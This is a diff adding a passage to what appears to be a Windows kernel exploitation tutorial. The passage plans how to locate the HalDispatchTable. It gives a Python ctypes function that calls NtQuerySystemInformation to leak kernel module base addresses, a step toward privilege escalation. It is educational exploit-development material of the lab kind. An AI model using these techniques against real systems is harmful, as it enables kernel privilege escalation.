@@ -176,6 +176,59 @@ For this portion, I would've been utterly lost without two resources: FuzzySec's
 
 Between these two examples, I was able to cobble together a Frankenstein Python script that took bits and pieces from both examples and then also things I came up with that made more sense to me. Because I couldn't just straight up use what they had written, I had to make my own way and that helped a lot. 
 
+We have a task ahead of us. We have to find the address of the `HalDispatchTable`. At a high-level, we can accomplish this by:
++ finding the kernel image base address,
++ grabbing a handle to the kernel image by using `LoadLibraryA`,
++ grabbing the userland `HalDispatchTable` address by using `GetProcAddress` with our kernel image handle,
++ and finally subtracting the kernel image handle from our userland `HalDispatchTable` address and then adding the kernel base address. 
+
+### Finding Kernel Base
+This can apparently be accomplished by using `NtQuerySystemInformation` (which can be found somewhat documented [here](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation)). The prototype is this:
+```C
+__kernel_entry NTSTATUS NtQuerySystemInformation(
+  IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+  OUT PVOID                   SystemInformation,
+  IN ULONG                    SystemInformationLength,
+  OUT PULONG                  ReturnLength
+);
+```
+
+For the `SystemInformationClass` parameter, we will be using the `SystemModuleInformation` argument. My saving grace throughout this portion was some documentation on the structures of this API [here](https://gist.github.com/jNizM/ddf02494cd78e743eed776ce6164758f). No way I finish this exploit without this help. 
+
+Looking at the documentation, `SystemModuleInformation` is `0x000B`. So we'll use the value `0xb` for this parameter. Let's start a new separate script that will just gather all the address information we need, we'll kick it off by calling `NtQuerySystemInformation`. Right now our script looks like this: 
+```python
+def base():
+    print("[*] Calling NtQuerySystemInformation w/SystemModuleInformation class" )
+    system_information = create_string_buffer(0)
+    system_information_length = c_ulong(0)
+    ntdll.NtQuerySystemInformation(
+        0xb,
+        system_information,
+        len(system_information),
+        addressof(system_information_length)
+    )
+
+    system_information = create_string_buffer(system_information_length.value)
+
+    result = ntdll.NtQuerySystemInformation(
+        0xb,
+        system_information,
+        len(system_information),
+        addressof(system_information_length)
+    )
+
+    if result == 0x00000000:
+        print("[*] Success, allocated {}-byte result buffer.".format(str(len(system_information))))
+        
+    elif result == 0xC0000004:
+        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)")
+
+    elif result == 0xC0000005:
+        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)")
+
+    else:
+        print("[!] NtQuerySystemInformation failed. NTSTATUS: {}").format(hex(result))
+ ```
 
 
 
